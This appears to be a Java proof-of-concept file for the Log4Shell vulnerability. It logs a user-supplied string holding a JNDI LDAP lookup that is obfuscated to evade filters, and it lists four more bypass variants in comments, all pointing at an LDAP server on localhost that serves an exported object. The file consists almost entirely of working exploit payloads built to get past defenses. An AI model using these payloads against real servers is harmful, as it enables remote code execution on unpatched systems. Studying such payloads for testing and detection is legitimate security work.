import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.layout.PatternLayout;

import java.util.function.LongFunction;

public class MoreDollarBypass {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        String username = "${${a:-j}ndi:ldap://127.0.0.1:1234/ExportObject}";
    //    String username = "${${a:-j}n${::-d}i:ldap://127.0.0.1:1234/ExportObject}";";
    //    String username = "${${lower:jn}di:ldap://127.0.0.1:1234/ExportObject}";
    //    String username = "${${lower:${upper:jn}}di:ldap://127.0.0.1:1234/ExportObject}";
    //    String username = "${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1234/ExportObject}";

        logger.info("User {} login in!", username);
    }
}
